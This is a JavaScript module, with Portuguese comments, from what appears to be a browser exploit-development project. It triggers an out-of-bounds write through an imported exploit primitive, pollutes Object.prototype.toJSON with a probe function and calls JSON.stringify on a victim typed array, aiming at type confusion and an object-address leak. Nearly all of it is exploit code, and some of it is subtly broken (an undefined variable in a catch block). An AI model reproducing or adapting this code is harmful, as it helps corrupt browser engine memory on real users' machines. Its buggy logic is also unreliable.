// js/script3/testArrayBufferVictimCrash.mjs (v77_ReplicateV25CircularError)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_write_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V77_RVCE = "OriginalHeisenbug_TypedArrayAddrof_v77_ReplicateV25CircularError";

const VICTIM_BUFFER_SIZE = 256;
const LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET = 0x7C;
const OOB_WRITE_VALUE = 0xFFFFFFFF; // Valor estável conhecido
const AGGRESSIVE_PROP_COUNT_V77 = 32; 

let object_to_leak_A_v77 = null;
let object_to_leak_B_v77 = null;
let victim_typed_array_ref_v77 = null; 
let probe_call_count_v77 = 0;
// Armazena a REFERÊNCIA ao objeto 'this' da última chamada da sonda onde 'this' era M2 e estava confuso
let last_confused_M2_ref_v77 = null; 
let marker_M1_ref_v77 = null; 
let marker_M2_ref_v77 = null; 

const PROBE_CALL_LIMIT_V77 = 5; 

function toJSON_TA_Probe_ReplicateV25() {
    probe_call_count_v77++;
    const call_num = probe_call_count_v77;
    // current_call_details é apenas para LOGGING INTERNO da sonda. Não é retornado nem se torna 'this'.
    let current_log_info = {
        call_number: call_num,
        probe_variant: "TA_Probe_ReplicateV25_v77",
        this_type: Object.prototype.toString.call(this),
        this_is_victim: (this === victim_typed_array_ref_v77),
        this_is_M1: (this === marker_M1_ref_v77 && marker_M1_ref_v77 !== null),
        this_is_M2: (this === marker_M2_ref_v77 && marker_M2_ref_v77 !== null),
        writes_on_M2_attempted: false,
        error_in_probe: null
    };
    logS3(`[${current_log_info.probe_variant}] Call #${call_num}. 'this': ${current_log_info.this_type}. IsVictim? ${current_log_info.this_is_victim}. IsM1? ${current_log_info.this_is_M1}. IsM2? ${current_log_info.this_is_M2}`, "leak");

    try {
        if (call_num > PROBE_CALL_LIMIT_V77) {
            logS3(`[${current_log_info.probe_variant}] Call #${call_num}: Probe call limit.`, "warn");
            // Guardar os detalhes desta chamada de parada para o log externo, se relevante
            if (!last_confused_M2_ref_v77) last_confused_M2_ref_v77 = current_log_info; 
            return { recursion_stopped_v77: true };
        }

        if (call_num === 1 && current_log_info.this_is_victim) {
            logS3(`[${current_log_info.probe_variant}] Call #${call_num}: 'this' is victim. Returning M1.`, "info");
            marker_M1_ref_v77 = { marker_id_v77: "M1_V77_Circular" };
            if (!last_confused_M2_ref_v77) last_confused_M2_ref_v77 = current_log_info;
            return marker_M1_ref_v77;
        } else if (call_num === 2 && current_log_info.this_type === '[object Object]' && !current_log_info.this_is_victim && !current_log_info.this_is_M1) {
            // Call #2, this é um ObjX confuso. Retornar M2.
            logS3(`[${current_log_info.probe_variant}] Call #${call_num}: 'this' is ObjX (unexpected ${current_log_info.this_type}). Returning M2.`, "info");
            marker_M2_ref_v77 = { marker_id_v77: "M2_V77_CircularTarget" }; // M2 agora tem um ID diferente
            if (!last_confused_M2_ref_v77) last_confused_M2_ref_v77 = current_log_info;
            return marker_M2_ref_v77;
        } else if (call_num >= 2 && current_log_info.this_is_M2 && current_log_info.this_type === '[object Object]') {
            // ESTE É O ALVO: this é M2 e está confuso!
            logS3(`[${current_log_info.probe_variant}] Call #${call_num}: TYPE CONFUSION ON M2 ('this')! Marker ID: ${this.marker_id_v77}. Applying writes...`, "vuln");
            
            // Atribuir os objetos de leak diretamente. Esperamos TypeError no runner ao logar.
            this.payload_A_v77 = object_to_leak_A_v77;
            this.payload_B_v77 = object_to_leak_B_v77;
            for (let i = 0; i < AGGRESSIVE_PROP_COUNT_V77; i++) {
                this[i] = (i % 2 === 0) ? object_to_leak_A_v77 : object_to_leak_B_v77;
            }
            current_log_info.writes_on_M2_attempted = true;
            logS3(`[${current_log_info.probe_variant}] Call #${call_num}: Writes to M2 ('this') completed. Keys: ${Object.keys(this).join(',')}`, "info");
            
            last_confused_M2_ref_v77 = this; // Guardar a REFERÊNCIA ao 'this' (M2) modificado
            return this; // Retorna M2 modificado
        } else {
             logS3(`[${current_log_info.probe_variant}] Call #${call_num}: Path not taken for M2 confusion. 'this' type: ${current_log_info.this_type}`, "dev_verbose");
             // Capturar os detalhes da última chamada se não for uma das acima.
             if (!last_confused_M2_ref_v77 || call_num > (last_confused_M2_ref_v77.call_number || 0) ) {
                 last_confused_M2_ref_v77 = current_log_info;
             }
        }
    } catch (e) {
        current_log_info.error_in_probe = e.message;
        if (!last_confused_M2_ref_v77 || call_num >= (last_confused_M2_ref_v77.call_number || 0) ) {
             last_confused_M2_ref_v77 = current_call_details; // Guarda os detalhes mesmo com erro
        }
    }
    
    return { generic_marker_v77: call_num }; 
}

export async function executeTypedArrayVictimAddrofTest_ReplicateV25CircularError() {
    const FNAME_CURRENT_TEST = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V77_RVCE}.triggerAndLog`;
    logS3(`--- Initiating ${FNAME_CURRENT_TEST}: Heisenbug (ReplicateV25CircularError) & Addrof ---`, "test", FNAME_CURRENT_TEST);
    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V77_RVCE} Init...`;

    probe_call_count_v77 = 0;
    last_confused_M2_ref_v77 = null; 
    victim_typed_array_ref_v77 = null; 
    marker_M1_ref_v77 = null;
    marker_M2_ref_v77 = null;
    object_to_leak_A_v77 = { marker_A_v77: "LeakA_v77rvce", idA: Date.now() }; 
    object_to_leak_B_v77 = { marker_B_v77: "LeakB_v77rvce", idB: Date.now() + Math.floor(Math.random() * 1000) };

    let errorCapturedMain = null;
    let stringifyOutput_parsed = null; 
    
    // Addrof results não são o foco principal, mas sim observar o TypeError e o objeto que o causa
    let addrof_A = { success: false, msg: "Addrof A: Default" };

    const fillPattern = 0.77777777777777;

    try {
        await triggerOOB_primitive({ force_reinit: true });
        oob_write_absolute(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET, OOB_WRITE_VALUE, 4);
        logS3(`  Critical OOB write done.`, "info", FNAME_CURRENT_TEST);
        await PAUSE_S3(100);

        victim_typed_array_ref_v77 = new Uint8Array(new ArrayBuffer(VICTIM_BUFFER_SIZE)); 
        // Preenchimento do buffer da vítima não é crítico aqui
        logS3(`STEP 2: victim_typed_array_ref_v77 (Uint8Array) created.`, "test", FNAME_CURRENT_TEST);
        
        const ppKey = 'toJSON';
        let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
        let pollutionApplied = false;

        try {
            Object.defineProperty(Object.prototype, ppKey, { value: toJSON_TA_Probe_ReplicateV25, writable: true, configurable: true, enumerable: false });
            pollutionApplied = true;
            let rawStringifyOutput = JSON.stringify(victim_typed_array_ref_v77); 
            logS3(`  JSON.stringify completed. Raw Stringify Output: ${rawStringifyOutput}`, "info", FNAME_CURRENT_TEST);
            try {
                stringifyOutput_parsed = JSON.parse(rawStringifyOutput); 
            } catch (e_parse) {
                stringifyOutput_parsed = { error_parsing_stringify_output: rawStringifyOutput, parse_error: e_parse.message };
            }
            
            // last_confused_M2_ref_v77 deve ser o M2 modificado, se a lógica funcionou.
            logS3(`  EXECUTE: last_confused_M2_ref_v77 (final state captured by test function): ${last_confused_M2_ref_v77 ? JSON.stringify(last_confused_M2_ref_v77) : 'N/A'}`, "leak", FNAME_CURRENT_TEST);

            let heisenbugOnM2 = false;
            if (last_confused_M2_ref_v77 && 
                last_confused_M2_ref_v77.marker_id_v77 === "M2_V77_CircularTarget" && // Verifica se é o M2
                last_confused_M2_ref_v77.this_type === "[object Object]" && // Se o M2 foi confuso (este campo é do current_log_info que descreveu M2)
                last_confused_M2_ref_v77.writes_on_M2_attempted) { // E se as escritas foram feitas nele
                heisenbugOnM2 = true;
            }
            logS3(`  EXECUTE: Heisenbug & Writes on M2 ${heisenbugOnM2 ? "CONFIRMED as primary target" : "NOT Confirmed as primary target"}.`, heisenbugOnM2 ? "vuln" : "error", FNAME_CURRENT_TEST);
                            
            // Não vamos checar addrof no buffer da vítima, pois não é o alvo desta estratégia.
            addrof_A.msg = "Addrof no buffer da vítima não aplicável nesta estratégia.";

            // O título será definido pelo runner baseado no TypeError esperado
            if (heisenbugOnM2) {
                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V77_RVCE}: M2 TC & Writes OK. Expect TypeError...`;
            } else {
                 document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V77_RVCE}: No M2 TC?`;
            }

        } catch (e_str) {
            errorCapturedMain = e_str; // Captura o TypeError aqui
            logS3(`    CRITICAL ERROR (EXPECTED TypeError?): ${e_str.name} - ${e_str.message}`, "critical", FNAME_CURRENT_TEST);
            if(e_str.name === 'TypeError' && e_str.message.includes("circular structure")) {
                 document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V77_RVCE}: CircularStruct TypeError (GOOD!)`;
            } else {
                 document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V77_RVCE}: JS Error: ${e_str.name}`;
            }
        } finally {
            if (pollutionApplied) {
                if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor); else delete Object.prototype[ppKey];
            }
        }
    } catch (e_outer_main) {
        errorCapturedMain = e_outer_main;
        document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V77_RVCE} CRITICAL FAIL`;
    } finally {
        clearOOBEnvironment();
        logS3(`--- ${FNAME_CURRENT_TEST} Completed ---`, "test", FNAME_CURRENT_TEST);
        logS3(`Total probe calls: ${probe_call_count_v77}`, "info", FNAME_CURRENT_TEST);
        logS3(`Final state of last_confused_M2_ref_v77 (to be returned as toJSON_details): ${last_confused_M2_ref_v77 ? JSON.stringify(last_confused_M2_ref_v77) : 'null'}`, "leak");

        victim_typed_array_ref_v77 = null; 
        probe_call_count_v77 = 0;
        marker_M1_ref_v77 = null;
        marker_M2_ref_v77 = null;
        // last_confused_M2_ref_v77 será retornado, então não limpar aqui ainda.
    }
    return { 
        errorOccurred: errorCapturedMain, 
        potentiallyCrashed: false, 
        stringifyResult: stringifyOutput_parsed, // Este será M1 serializado
        // Retornar o objeto M2 modificado (referenciado por last_confused_M2_ref_v77)
        // O runner tentará JSON.stringify(este_objeto), o que deve causar o TypeError.
        toJSON_details: last_confused_M2_ref_v77 ? JSON.parse(JSON.stringify(last_confused_M2_ref_v77)) : null,
        total_probe_calls: probe_call_count_v77, // Será 0 devido ao reset, mas o log acima tem o valor
        // Addrof results não são o foco primário, mas incluídos para o runner
        addrof_A_result: addrof_A
    };
}
